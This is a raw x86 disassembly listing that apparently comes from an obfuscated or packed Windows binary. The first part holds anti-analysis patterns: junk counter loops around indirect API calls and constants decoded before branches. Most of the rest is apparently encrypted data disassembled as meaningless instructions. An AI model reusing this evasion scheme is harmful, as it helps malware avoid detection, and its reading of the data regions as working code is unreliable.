  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x430626,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e8e6,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e8e6
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e8e6,ecx
  403899:	cmp    DWORD PTR ds:0x42e8e6,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e8e6,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42eb5c
  4038bc:	cmp    DWORD PTR ds:0x42e8e6,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e8e6
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e8e6,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42efa8,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42efa8
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42efa8,edi
  403903:	cmp    DWORD PTR ds:0x42efa8,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42eb74
  403920:	cmp    DWORD PTR ds:0x42efa8,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42efa8
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42efa8,edi
  40393a:	cmp    DWORD PTR ds:0x42efa8,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ef9c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ef9c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ef9c,ecx
  403963:	cmp    DWORD PTR ds:0x42ef9c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ef9c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ed1c
  403988:	cmp    DWORD PTR ds:0x42ef9c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ef9c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ef9c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ef94,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x430626
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43060e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x43062a,0x1d
  4039e0:	cmp    DWORD PTR ds:0x43062a,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x43062a,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42eb60
  403a03:	mov    edi,DWORD PTR ds:0x43062a
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x43062a,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42efb0,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x43062a
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x4306da,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x4306da
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x4306da,edx
  403a58:	cmp    DWORD PTR ds:0x4306da,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42eb78
  403a77:	cmp    DWORD PTR ds:0x4306da,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x4306c2,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e8da,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x4306ca,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43060a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430712
  403aee:	mov    edx,DWORD PTR ds:0x42eb30
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x430632,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ef9c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x43062a,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x43062a
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x43062a,edx
  403b28:	cmp    DWORD PTR ds:0x43062a,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42ec40
  403b43:	cmp    DWORD PTR ds:0x43062a,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x43062a
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x43062a,edx
  403b5d:	cmp    DWORD PTR ds:0x43062a,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x4306c2,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430612,0x4306d2
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43060e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43060a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x430642,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42efa0,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42efb0
  403bc5:	and    ebx,DWORD PTR ds:0x4306d2
  403bcb:	mov    DWORD PTR ds:0x42efb0,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e8da,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e8da
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e8da,ebx
  403bea:	cmp    DWORD PTR ds:0x42e8da,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42eb7c
  403c05:	cmp    DWORD PTR ds:0x42e8da,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x430642,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43060e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43060e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43060e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42eb80
  403c4d:	cmp    DWORD PTR ds:0x43060e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43060e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43060e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43060e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43060e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x4306ce,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x4306ca,0x430642
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430606
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x4306ca
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42efa4,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43060a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x43062e,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e8f6
  403ce8:	adc    DWORD PTR ds:0x42ef90,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x43062a
  403cfb:	sbb    DWORD PTR ds:0x42e8ee,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0x4622cd93],0xffffffb5
  403d2b:	out    0xb6,eax
  403d2d:	adc    DWORD PTR [esi+0x7e],edi
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403cf9
  403d35:	push   esi
  403d36:	fs mov ss,ecx
  403d39:	inc    ebp
  403d3a:	loop   0x403d0b
  403d3c:	shl    DWORD PTR [ebp+0x1e],0x79
  403d40:	loop   0x403d4a
  403d42:	aad    0x60
  403d44:	sbb    ebx,DWORD PTR [eax+0x38845289]
  403d4a:	push   edx
  403d4b:	fdiv   DWORD PTR [edi-0x5ea77b45]
  403d51:	push   ds
  403d52:	lea    edi,[eax+0x1]
  403d55:	jmp    0x403d03
  403d57:	mov    al,0x9d
  403d59:	add    eax,0xb76007b5
  403d5e:	adc    eax,0x9529ee9a
  403d63:	xor    DWORD PTR [ebp-0x16849b1c],edi
  403d69:	lods   al,BYTE PTR ds:[esi]
  403d6a:	sub    edx,DWORD PTR [edx+0x63]
  403d6d:	pop    esi
  403d6e:	mov    al,0xb7
  403d70:	xor    eax,0x3a36f6c9
  403d75:	adc    DWORD PTR [edi],ebp
  403d77:	js     0x403dbe
  403d79:	js     0x403de0
  403d7b:	adc    DWORD PTR [edi],ebx
  403d7d:	fcmovu st,st(2)
  403d7f:	gs jno 0x403d2e
  403d82:	sbb    BYTE PTR [ebp+ebp*8-0x1af86d85],ah
  403d89:	rcl    BYTE PTR [edi],cl
  403d8b:	stos   DWORD PTR es:[edi],eax
  403d8c:	sbb    esi,ecx
  403d8e:	das    
  403d8f:	mov    al,ds:0xde363de8
  403d94:	test   BYTE PTR fs:[esi-0x767a80e1],ah
  403d9b:	fnstsw WORD PTR [esi+0x289c6d45]
  403da1:	clc    
  403da2:	es cld 
  403da4:	xchg   DWORD PTR [edx],ebp
  403da6:	test   eax,0xfae09e9
  403dab:	pop    ecx
  403dac:	dec    esi
  403dad:	sub    edx,DWORD PTR [ebp-0x2d9436ea]
  403db3:	add    DWORD PTR [edi],0xffffffa7
  403db6:	fwait
  403db7:	mov    BYTE PTR [eax],cl
  403db9:	mov    dl,0x52
  403dbb:	(bad)  
  403dbc:	fstp   DWORD PTR [eax+0x42654978]
  403dc2:	in     al,dx
  403dc3:	(bad)
  403dc7:	mov    bh,0x45
  403dc9:	adc    DWORD PTR [eax-0x2a],eax
  403dcc:	paddsw mm6,QWORD PTR [eax]
  403dcf:	and    BYTE PTR [ecx-0x23],al
  403dd2:	push   ds
  403dd3:	clc    
  403dd4:	mov    bl,0xaf
  403dd6:	push   cs
  403dd7:	pop    esp
  403dd8:	bound  edx,QWORD PTR [esi]
  403dda:	and    eax,0x8c3bac9f
  403ddf:	or     al,BYTE PTR [esi]
  403de1:	or     BYTE PTR [eax+0x3],bh
  403de4:	pop    esp
  403de5:	cmp    al,0x64
  403de7:	addr16 das 
  403de9:	inc    esi
  403dea:	sbb    eax,eax
  403dec:	popf   
  403ded:	and    ch,BYTE PTR [edi-0x6c]
  403df0:	(bad)  
  403df1:	cmc    
  403df2:	push   ss
  403df3:	call   0x4b5334a0
  403df8:	aam    0xa0
  403dfa:	adc    DWORD PTR [eax+0x64bef81a],ebp
  403e00:	inc    edx
  403e01:	nop
  403e02:	repnz clc 
  403e04:	in     al,0xbe
  403e06:	and    al,0x7
  403e08:	add    ebp,0x34
  403e0b:	in     al,0x91
  403e0d:	jo     0x403e71
  403e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e10:	ror    ebp,cl
  403e12:	mov    esi,0xa2cce98a
  403e17:	push   0x3c86be2b
  403e1c:	cmp    eax,0x41452fba
  403e21:	sbb    ch,BYTE PTR [edx]
  403e23:	mov    WORD PTR [edx+edi*4+0xc],fs
  403e27:	(bad)  
  403e28:	xchg   DWORD PTR [eax-0x2e],esi
  403e2b:	mov    edi,DWORD PTR [ebp-0x2cbb184c]
  403e31:	das    
  403e32:	push   esp
  403e33:	push   cs
  403e34:	add    DWORD PTR [esi+0x5a],0x67
  403e38:	fsubr  st,st(2)
  403e3a:	add    ch,0x66
  403e3d:	sub    eax,0xa6f7120e
  403e42:	hlt    
  403e43:	push   ecx
  403e44:	das    
  403e45:	jae    0x403e3d
  403e47:	daa    
  403e48:	sub    bh,BYTE PTR [ebx+0x41]
  403e4b:	addr16 inc ebp
  403e4d:	pop    esp
  403e4e:	or     al,0x9e
  403e50:	inc    eax
  403e51:	pushf  
  403e52:	popf   
  403e53:	mov    dl,0x52
  403e55:	sbb    eax,0xd65b77fd
  403e5a:	push   ebx
  403e5b:	mov    ds:0x33370bb6,eax
  403e60:	inc    ebp
  403e61:	push   es
  403e62:	addr16 push eax
  403e64:	inc    edx
  403e65:	and    al,0x1d
  403e67:	hlt    
  403e68:	jo     0x403dee
  403e6a:	and    al,0x8a
  403e6c:	mov    ds:0xb49082a6,eax
  403e71:	scas   al,BYTE PTR es:[edi]
  403e72:	cmp    eax,edx
  403e74:	pop    ebx
  403e75:	push   esp
  403e76:	add    eax,0x476e53bf
  403e7b:	adc    BYTE PTR [edx+esi*8+0x2b],cl
  403e7f:	es xchg esi,eax
  403e81:	aam    0x6a
  403e83:	mov    al,0x88
  403e85:	in     al,dx
  403e86:	iret   
  403e87:	add    DWORD PTR [edi+0x45],eax
  403e8a:	lea    ebx,[ecx-0x79]
  403e8d:	pop    edx
  403e8e:	and    ah,BYTE PTR ds:0x510240f8
  403e94:	in     al,0x48
  403e96:	mov    ds:0xe0c2773e,eax
  403e9b:	into   
  403e9c:	adc    ebx,DWORD PTR [eax]
  403e9e:	lods   eax,DWORD PTR ds:[esi]
  403e9f:	and    al,0xdd
  403ea1:	in     al,dx
  403ea2:	inc    ebx
  403ea3:	adc    DWORD PTR [edi-0x24173af3],esp
  403ea9:	shl    BYTE PTR [ecx],cl
  403eab:	push   cs
  403eac:	ss add dh,ah
  403eaf:	cmp    al,0x64
  403eb1:	xor    cl,BYTE PTR [ebx-0x1905cf06]
  403eb7:	sbb    eax,0xfc7e4a2a
  403ebc:	mov    al,0xde
  403ebe:	and    al,0x2b
  403ec0:	mov    ecx,DWORD PTR [ebx+0x4ae9d855]
  403ec6:	pop    es
  403ec7:	add    BYTE PTR [eax],al
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0xcd7278c4,al
  403efc:	xlat   BYTE PTR ds:[ebx]
  403efd:	jl     0x403f12
  403eff:	ret    
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403f2e
  403f08:	nop
  403f09:	mov    ah,0x20
  403f0b:	sbb    esi,esi
  403f0d:	loop   0x403e9f
  403f0f:	inc    esi
  403f10:	stc    
  403f11:	lea    ebx,[edi+eax*2]
  403f14:	mov    edx,0x1d5b7662
  403f19:	retf   0x3d70
  403f1c:	daa    
  403f1d:	repz mov al,ds:0x4d5fd31
  403f23:	push   0xfffffff9
  403f25:	ja     0x403f3f
  403f27:	fidivr WORD PTR ss:[edx]
  403f2a:	xor    DWORD PTR [esi],0xffffffe5
  403f2d:	push   0xc1477c9a
  403f32:	inc    edx
  403f33:	push   edx
  403f34:	push   eax
  403f35:	mov    eax,ds:0x2580a0b4
  403f3a:	std    
  403f3b:	dec    edi
  403f3c:	daa    
  403f3d:	rcr    BYTE PTR ds:0xc0d27377,0x90
  403f44:	add    BYTE PTR [edi+0x6dda232f],0xc2
  403f4b:	pushf  
  403f4c:	inc    esp
  403f4d:	dec    eax
  403f4e:	adc    eax,0x68f4896f
  403f53:	and    BYTE PTR [ebx-0x2e],cl
  403f56:	loop   0x403f08
  403f58:	imul   esi,DWORD PTR [esi],0xd9f73b1
  403f5e:	fwait
  403f5f:	xchg   ecx,eax
  403f60:	stos   DWORD PTR es:[edi],eax
  403f61:	mov    al,ds:0x82730729
  403f66:	inc    ecx
  403f67:	les    ebp,FWORD PTR ds:0xa19bceee
  403f6d:	adc    esp,ebp
  403f6f:	inc    ecx
  403f70:	loopne 0x403fe3
  403f72:	ficom  DWORD PTR [esi+0x49f414b7]
  403f78:	mov    al,ds:0x8630b4ad
  403f7d:	pop    ss
  403f7e:	cld    
  403f7f:	cmp    DWORD PTR [edi-0x23],ebx
  403f82:	inc    esi
  403f83:	push   esp
  403f84:	inc    esi
  403f85:	test   BYTE PTR [ebx-0x54],0xf1
  403f89:	add    eax,0xb91ba7f5
  403f8e:	push   edx
  403f8f:	int    0x31
  403f91:	iret   
  403f92:	add    bl,BYTE PTR [edx]
  403f94:	inc    ecx
  403f95:	pop    edi
  403f96:	fcmovne st,st(2)
  403f98:	inc    esi
  403f99:	ins    DWORD PTR es:[edi],dx
  403f9a:	hlt    
  403f9b:	dec    esp
  403f9c:	xor    ebx,DWORD PTR [edx+0x48]
  403f9f:	sar    DWORD PTR [esp+esi*2+0x4f],0xf5
  403fa4:	ret    0x57d6
  403fa7:	xlat   BYTE PTR ds:[ebx]
  403fa8:	adc    BYTE PTR [edx-0x2f],cl
  403fab:	add    BYTE PTR [ebp-0x763c2d49],bl
  403fb1:	pop    ss
  403fb2:	xchg   cl,cl
  403fb4:	jo     0x403f4b
  403fb6:	ss add al,0xd9
  403fb9:	ss jl  0x403fcd
  403fbc:	retf   
  403fbd:	mov    dl,BYTE PTR [ebp-0x6d]
  403fc0:	and    BYTE PTR [edi-0x2b],0x72
  403fc4:	in     eax,0x4d
  403fc6:	inc    ecx
  403fc7:	pop    ebp
  403fc8:	pop    edx
  403fc9:	retf   0x121d
  403fcc:	inc    edx
  403fcd:	out    dx,al
  403fce:	jmp    0x2e29:0xe51e58d1
  403fd5:	repz out dx,eax
  403fd7:	and    eax,0x99242f59
  403fdc:	dec    ebp
  403fdd:	inc    ebp
  403fde:	pushf  
  403fdf:	(bad)  
  403fe1:	jmp    0x404056
  403fe3:	cmp    eax,0xe3a6f28
  403fe8:	into   
  403fe9:	outs   dx,BYTE PTR ds:[esi]
  403fea:	cdq    
  403feb:	push   ss
  403fec:	hlt    
  403fed:	out    0x8e,eax
  403fef:	pop    edi
  403ff0:	fldcw  WORD PTR [ecx-0x7]
  403ff3:	dec    ebp
  403ff4:	or     esp,DWORD PTR [ebp-0x1]
  403ff7:	push   es
  403ff8:	jg     0x403ff5
  403ffa:	xchg   esi,eax
  403ffb:	mov    dh,0xb9
  403ffd:	fucomi st,st(1)
  403fff:	pushf  
  404000:	in     al,0xdc
  404002:	xchg   edx,eax
  404003:	dec    edx
  404004:	loope  0x404065
  404006:	call   0xd032:0xcd532164
  40400d:	push   esp
  40400e:	lds    esi,FWORD PTR [esi-0x3213d0cc]
  404014:	fs pop ecx
  404016:	or     al,0xb1
  404018:	mov    ebx,0x93f37e29
  40401d:	(bad)  
  40401e:	pop    ecx
  40401f:	inc    ecx
  404020:	fdivr  st(0),st
  404022:	pop    edx
  404023:	mov    ah,0x63
  404025:	adc    eax,0xd225fa1f
  40402a:	fcom   DWORD PTR [esi+0x5c]
  40402d:	jae    0x404005
  40402f:	imul   ecx,eax,0xffffffbb
  404032:	iret   
  404033:	pop    edi
  404034:	or     al,0xbd
  404036:	call   0xf2b19da0
  40403b:	aad    0xb9
  40403d:	inc    esp
  40403e:	cmp    DWORD PTR [eax-0x28cd86b5],ebx
  404044:	loope  0x404028
  404046:	repnz mov dh,dh
  404049:	out    dx,eax
  40404a:	imul   ebp,DWORD PTR [ebp-0x22e90913],0xffffff9c
  404051:	and    al,0xb5
  404053:	retf   0xa222
  404056:	add    edx,ebx
  404058:	fisubr DWORD PTR [ebx+0x69]
  40405b:	test   dl,cl
  40405d:	inc    edi
  40405e:	cmp    BYTE PTR [esp+eax*1-0x1ddda24b],0x5f
  404066:	adc    BYTE PTR [ecx],0x26
  404069:	xchg   edi,eax
  40406a:	ja     0x404015
  40406c:	shl    DWORD PTR [esi-0x7ccc265c],1
  404072:	cdq    
  404073:	xchg   esi,eax
  404074:	repnz lahf 
  404076:	cwde   
  404077:	pop    es
  404078:	pop    es
  404079:	mov    esi,DWORD PTR [eax-0xc87bc3]
  40407f:	ss test BYTE PTR es:[edi],bh
  404083:	sub    edx,ebp
  404085:	repz inc ebp
  404087:	dec    ebx
  404088:	sbb    al,0x57
  40408a:	push   es
  40408b:	adc    esp,DWORD PTR ds:0xbe05ef9f
  404091:	repz jne 0x404095
  404094:	mov    edx,DWORD PTR [ebp-0x2c]
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x2d597865]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x404106
  4040c0:	sub    DWORD PTR [ebx],esp
  4040c2:	mov    esp,eax
  4040c4:	jae    0x404082
  4040c6:	and    al,0x42
  4040c8:	cmp    cl,ch
  4040ca:	mov    ebp,0xafa711b7
  4040cf:	jg     0x404108
  4040d1:	mov    eax,0x801ceeb0
  4040d6:	dec    ecx
  4040d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d8:	mov    eax,0x3235f3bd
  4040dd:	push   ss
  4040de:	bound  esp,QWORD PTR ds:0x8dfb184e
  4040e4:	leave  
  4040e5:	retf   
  4040e6:	js     0x40409c
  4040e8:	pop    edx
  4040e9:	gs sub al,0xb6
  4040ec:	fsubp  st(1),st
  4040ee:	xor    ebx,DWORD PTR [ecx]
  4040f0:	rcr    BYTE PTR [ebx-0x5],cl
  4040f3:	dec    edx
  4040f4:	adc    dh,BYTE PTR [ecx-0x7981fcc5]
  4040fa:	scas   eax,DWORD PTR es:[edi]
  4040fb:	sub    eax,0x97624942
  404100:	shr    DWORD PTR [eax+0x48],0x4e
  404104:	or     eax,0xc265a681
  404109:	push   DWORD PTR [ebx]
  40410b:	cli    
  40410c:	lahf   
  40410d:	stos   BYTE PTR es:[edi],al
  40410e:	add    bh,BYTE PTR [ebp+0xf469578]
  404114:	dec    esp
  404115:	and    eax,0x4df9a21b
  40411a:	xor    al,0x65
  40411d:	mov    esi,0xb007dfe7
  404122:	jnp    0x4041a3
  404124:	mov    edi,ebp
  404126:	pop    es
  404127:	inc    edx
  404128:	dec    esi
  404129:	adc    eax,0x83f94287
  40412e:	cmp    dh,BYTE PTR [ebp-0x4b]
  404131:	test   DWORD PTR [edi+0x4ba20dd4],esi
  404137:	pop    ss
  404138:	cdq    
  404139:	adc    dl,BYTE PTR [edi-0x45]
  40413c:	dec    ecx
  40413d:	mov    bl,0x65
  40413f:	std    
  404140:	pop    ebx
  404141:	jecxz  0x404163
  404143:	and    DWORD PTR ds:0x8c4fe155,edi
  404149:	ret    0x995a
  40414c:	xor    esp,DWORD PTR [edx+edi*8+0x77]
  404150:	sbb    al,0xa3
  404152:	syscall 
  404154:	test   BYTE PTR [edx],bl
  404156:	adc    eax,0x6caf8be6
  40415b:	cmc    
  40415c:	adc    BYTE PTR ds:0x9477ff49,0xdb
  404163:	sbb    dh,BYTE PTR [edx]
  404165:	adc    BYTE PTR [eax],dl
  404167:	dec    edx
  404168:	lock xor bl,BYTE PTR [ecx-0x55a7cffc]
  40416f:	xchg   ebx,eax
  404170:	imul   esi,eax,0x17ea88f
  404176:	shl    ebx,0xd4
  404179:	or     eax,0x6d70d3a7
  40417e:	fstp   TBYTE PTR [edx]
  404180:	das    
  404181:	inc    eax
  404182:	cmp    edi,edi
  404184:	sbb    DWORD PTR [eax-0x5b],esp
  404187:	mov    ah,0xee
  404189:	cmc    
  40418a:	push   ebx
  40418b:	pop    ebp
  40418c:	pop    sp
  40418e:	jmp    0x404115
  404190:	push   0x6e3e0d7d
  404195:	or     ebx,eax
  404197:	repz sbb bl,ah
  40419a:	cli    
  40419b:	add    ebx,ebx
  40419d:	dec    eax
  40419e:	push   cs
  40419f:	mov    eax,ds:0x3dd1b8f9
  4041a4:	pop    esi
  4041a5:	lea    ecx,[edx+0x7306698f]
  4041ab:	mov    al,ds:0xccc26ecc
  4041b0:	push   ds
  4041b1:	or     ebp,0x71
  4041b4:	jbe    0x404205
  4041b6:	cmc    
  4041b7:	inc    eax
  4041b8:	cwde   
  4041b9:	out    0xb6,eax
  4041bb:	je     0x4041ee
  4041bd:	dec    ebp
  4041be:	xchg   ebp,eax
  4041bf:	lahf   
  4041c0:	xchg   esi,eax
  4041c1:	das    
  4041c2:	lea    esi,[eax-0x13]
  4041c5:	shl    DWORD PTR [ebx-0x4],0x94
  4041c9:	loope  0x40423f
  4041cb:	in     al,0xee
  4041cd:	aas    
  4041ce:	or     al,0x41
  4041d0:	sahf   
  4041d1:	iret   
  4041d2:	lods   eax,DWORD PTR ds:[esi]
  4041d3:	jecxz  0x4041b3
  4041d5:	data16 in al,dx
  4041d7:	ret    
  4041d8:	mov    cl,0xc7
  4041da:	push   0x3bea897c
  4041df:	or     ebx,DWORD PTR [ebx-0x74]
  4041e2:	addr16 daa 
  4041e4:	je     0x4041fc
  4041e6:	scas   al,BYTE PTR es:[edi]
